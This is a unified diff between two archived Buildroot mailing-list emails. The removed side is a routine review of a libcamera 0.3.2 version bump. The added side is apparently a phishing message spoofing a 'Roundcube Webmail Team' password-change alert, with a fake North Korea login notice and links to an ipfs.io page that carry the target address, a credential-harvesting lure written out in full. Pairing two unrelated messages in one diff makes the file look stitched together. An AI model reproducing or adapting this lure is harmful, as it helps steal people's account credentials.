@@ -1,70 +1,52 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3A802CEF152
-	for <buildroot@archiver.kernel.org>; Tue,  8 Oct 2024 11:40:27 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3287DCEF17A
+	for <buildroot@archiver.kernel.org>; Tue,  8 Oct 2024 14:13:07 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 1271640A9E;
-	Tue,  8 Oct 2024 11:40:24 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id A666F4054E;
+	Tue,  8 Oct 2024 14:13:07 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id 6RHbXnMmj6bJ; Tue,  8 Oct 2024 11:40:23 +0000 (UTC)
+Received: from smtp4.osuosl.org ([127.0.0.1])
+ by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id SrMkdZ2yYV49; Tue,  8 Oct 2024 14:13:06 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 2557C40AC9
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 95D8F40553
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 2557C40AC9;
-	Tue,  8 Oct 2024 11:40:22 +0000 (UTC)
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
- by ash.osuosl.org (Postfix) with ESMTP id 36BF21BF3EB
- for <buildroot@lists.busybox.net>; Tue,  8 Oct 2024 11:40:19 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 95D8F40553;
+	Tue,  8 Oct 2024 14:13:06 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 0323C1BF36F
+ for <buildroot@lists.busybox.net>; Tue,  8 Oct 2024 14:13:05 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp2.osuosl.org (Postfix) with ESMTP id 256FD40AC9
- for <buildroot@lists.busybox.net>; Tue,  8 Oct 2024 11:40:19 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id E688980B8E
+ for <buildroot@lists.busybox.net>; Tue,  8 Oct 2024 14:13:04 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id p0BxI2MtRKvK for <buildroot@lists.busybox.net>;
- Tue,  8 Oct 2024 11:40:18 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=213.167.242.64;
- helo=perceval.ideasonboard.com; envelope-from=kieran.bingham@ideasonboard.com;
- receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp2.osuosl.org C801540A9E
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org C801540A9E
-Received: from perceval.ideasonboard.com (perceval.ideasonboard.com
- [213.167.242.64])
- by smtp2.osuosl.org (Postfix) with ESMTPS id C801540A9E
- for <buildroot@buildroot.org>; Tue,  8 Oct 2024 11:40:17 +0000 (UTC)
-Received: from pendragon.ideasonboard.com
- (cpc89244-aztw30-2-0-cust6594.18-1.cable.virginm.net [86.31.185.195])
- by perceval.ideasonboard.com (Postfix) with ESMTPSA id 95CD010B6;
- Tue,  8 Oct 2024 13:33:03 +0200 (CEST)
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id 1J4JXaWJee0m for <buildroot@lists.busybox.net>;
+ Tue,  8 Oct 2024 14:13:04 +0000 (UTC)
+X-Greylist: delayed 61918 seconds by postgrey-1.37 at util1.osuosl.org;
+ Tue, 08 Oct 2024 14:13:04 UTC
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 0549980B82
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 0549980B82
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=104.168.34.171;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+Received: from busybox.net (unknown [104.168.34.171])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 0549980B82
+ for <buildroot@busybox.net>; Tue,  8 Oct 2024 14:13:03 +0000 (UTC)
+From: Roundcube Webmail Team <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 8 Oct 2024 16:13:03 +0200
+Message-ID: <20241008161302.5ACEC46631108999@busybox.net>
 MIME-Version: 1.0
-In-Reply-To: <20241007192950.448350-1-ju.o@free.fr>
-References: <20241007192950.448350-1-ju.o@free.fr>
-From: Kieran Bingham <kieran.bingham@ideasonboard.com>
-To: Julien Olivain <ju.o@free.fr>, buildroot@buildroot.org
-Date: Tue, 08 Oct 2024 12:34:37 +0100
-Message-ID: <172838727715.532453.9966379310142996785@ping.linuxembedded.co.uk>
-User-Agent: alot/0.10
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=ideasonboard.com; s=mail; t=1728387183;
- bh=MDnUCtlBtaEwlWe0up3iie+x3x+Zmtzbp6w9LAa0YXE=;
- h=In-Reply-To:References:Subject:From:Cc:To:Date:From;
- b=oYdqegJkWqDrxX/qZonXwG+pDlfYt6DzMrBztVLxEaKLGHvpu8K+Zu+O2QtsQUL+G
- 5vqC/mwz2+z96YN5P4ojESOWuvlD3XzkXQeqFoLCOxcVkvn07EtHpxMmi4FQDMJ0tF
- hWZ2eDs+kO3UpjzkTLtxGE29fDy9isNpRDxgrFu8=
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
  dmarc=none (p=none dis=none)
- header.from=ideasonboard.com
-X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
- dkim=pass (1024-bit key,
- unprotected) header.d=ideasonboard.com header.i=@ideasonboard.com
- header.a=rsa-sha256 header.s=mail header.b=oYdqegJk
-Subject: Re: [Buildroot] [PATCH 1/1] package/libcamera: bump to version 0.3.2
+ header.from=busybox.net
+Subject: [Buildroot] Password Change Alert
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -76,58 +58,135 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Marcus Folkesson <marcus.folkesson@gmail.com>,
- Julien Olivain <ju.o@free.fr>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============7801966223909570124=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Quoting Julien Olivain (2024-10-07 20:29:50)
-> For change log since 0.3.0, see:
-> https://git.libcamera.org/libcamera/libcamera.git/tag/?h=v0.3.2
-> https://git.libcamera.org/libcamera/libcamera.git/tag/?h=v0.3.1
-> 
-> Signed-off-by: Julien Olivain <ju.o@free.fr>
+--===============7801966223909570124==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
+<!DOCTYPE HTML>
 
-Reviewed-by: Kieran Bingham <kieran.bingham@ideasonboard.com>
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
+<body style=3D"margin: 0.4em;"><p><br></p><div id=3D"forwardbody1"><div><ta=
+ble dir=3D"ltr">
+<tbody>
+<tr>
+<td id=3D"v1i1" style=3D'padding: 0px; color: rgb(112, 112, 112); font-fami=
+ly: "Segoe UI Semibold", "Segoe UI Bold", "Segoe UI", "Helvetica Neue Mediu=
+m", Arial, sans-serif; font-size: 17px;'>Roundcube Webmail</td>
+</tr>
+<tr>
+<td id=3D"v1i2" style=3D'padding: 0px; color: rgb(38, 114, 236); font-famil=
+y: "Segoe UI Light", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif=
+; font-size: 41px;'>Your password changed</td>
+</tr>
+<tr>
+<td id=3D"v1i3" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
+>Your password for <a class=3D"v1link" id=3D"v1iAccount" style=3D"color: rg=
+b(38, 114, 236); text-decoration: none;" href=3D"mailto:a**s@wizardfancydre=
+ss.co.uk" rel=3D"noreferrer">buildroot@busybox.net</a> was changed on&nbsp;=
+10/8/2024 4:13:02 p.m. (GMT).</td>
+</tr>
+<tr>
+<td id=3D"v1i4" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
+>If this was you, then you can safely ignore this email.</td>
+</tr>
+<tr>
+<td id=3D"v1i5" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
+>Security info used: buildroot@busybox.net</td>
+</tr>
+<tr>
+<td id=3D"v1i6" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
+-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
+Country/region: North Korea</td>
+</tr>
+<tr>
+<td id=3D"v1i7" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
+-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
+Platform: Windows</td>
+</tr>
+<tr>
+<td id=3D"v1i8" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
+-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
+Browser: Chrome</td>
+</tr>
+<tr>
+<td id=3D"v1i9" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
+-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
+IP address: 143.159.78.6</td>
+</tr>
+<tr>
+<td id=3D"v1i10" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
+nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
+'>If this wasn't you, your account has been compromised. Please follow thes=
+e steps:</td>
+</tr>
+<tr>
+<td id=3D"v1i11" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
+><a class=3D"v1link" id=3D"v1iLink1" style=3D"color: rgb(38, 114, 236); tex=
+t-decoration: none;" href=3D"https://ipfs.io/ipfs/bafkreihhvvjeuvn47mw4kj67=
+bl6bbu3rgercxu7zsy6bteuvxpztze5fxa?cms=3Dbuildroot@busybox.net" target=3D"_=
+blank" rel=3D"noopener noreferrer">1. Reset your password.</a></td>
+</tr>
+<tr>
+<td id=3D"v1i12" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
+><a class=3D"v1link" id=3D"v1iLink4" style=3D"color: rgb(38, 114, 236); tex=
+t-decoration: none;" href=3D"https://ipfs.io/ipfs/bafkreihhvvjeuvn47mw4kj67=
+bl6bbu3rgercxu7zsy6bteuvxpztze5fxa?cms=3Dbuildroot@busybox.net" target=3D"_=
+blank" rel=3D"noopener noreferrer">2. Review your security info.</a></td>
+</tr>
+<tr>
+<td id=3D"v1i13" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); fon=
+t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
+><a class=3D"v1link" id=3D"v1iLink2" style=3D"color: rgb(38, 114, 236); tex=
+t-decoration: none;" href=3D"https://ipfs.io/ipfs/bafkreihhvvjeuvn47mw4kj67=
+bl6bbu3rgercxu7zsy6bteuvxpztze5fxa?cms=3Dbuildroot@busybox.net" target=3D"_=
+blank" rel=3D"noopener noreferrer">3. Learn how to make your account more s=
+ecure.</a></td>
+</tr>
+<tr>
+<td id=3D"v1i14" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
+nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
+'>You can also <a class=3D"v1link" id=3D"v1iLink3" style=3D"color: rgb(38, =
+114, 236); text-decoration: none;" href=3D"https://ipfs.io/ipfs/bafkreihhvv=
+jeuvn47mw4kj67bl6bbu3rgercxu7zsy6bteuvxpztze5fxa?cms=3Dbuildroot@busybox.ne=
+t" target=3D"_blank" rel=3D"noopener noreferrer">opt out</a> or change wher=
+e you receive security notifications.</td>
+</tr>
+<tr>
+<td id=3D"v1i15" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
+nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
+'>Thanks,</td>
+</tr>
+<tr>
+<td id=3D"v1i16" style=3D'padding: 0px; color: rgb(42, 42, 42); font-family=
+: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>Roundcu=
+be Webmail Team</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div></body></html>
 
-> ---
-> Patch tested in:
-> https://gitlab.com/jolivain/buildroot/-/jobs/8014299351
-> ---
->  package/libcamera/libcamera.hash | 2 +-
->  package/libcamera/libcamera.mk   | 2 +-
->  2 files changed, 2 insertions(+), 2 deletions(-)
-> 
-> diff --git a/package/libcamera/libcamera.hash b/package/libcamera/libcamera.hash
-> index 1566356b99..d4554af190 100644
-> --- a/package/libcamera/libcamera.hash
-> +++ b/package/libcamera/libcamera.hash
-> @@ -1,4 +1,4 @@
-> -sha256  1e0a3feff93577a30bcd4e67aa4c1969aecabcd90f78f540a637bb77553c5a7d  libcamera-v0.3.0-git4.tar.gz
-> +sha256  d396bebe49aa7f605403594be3a9e970173d4c98061033c75f816946ff907eb8  libcamera-v0.3.2-git4.tar.gz
->  
->  # license files
->  sha256  fd38b2c053c0cce46d9c5ef3545a6e34d157a240ba99c9b8dca5d37a8147da6c  LICENSES/BSD-2-Clause.txt
-> diff --git a/package/libcamera/libcamera.mk b/package/libcamera/libcamera.mk
-> index dfcd340b75..0273cd2b17 100644
-> --- a/package/libcamera/libcamera.mk
-> +++ b/package/libcamera/libcamera.mk
-> @@ -5,7 +5,7 @@
->  ################################################################################
->  
->  LIBCAMERA_SITE = https://git.linuxtv.org/libcamera.git
-> -LIBCAMERA_VERSION = v0.3.0
-> +LIBCAMERA_VERSION = v0.3.2
->  LIBCAMERA_SITE_METHOD = git
->  LIBCAMERA_DEPENDENCIES = \
->         host-openssl \
-> -- 
-> 2.46.2
->
+--===============7801966223909570124==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============7801966223909570124==--
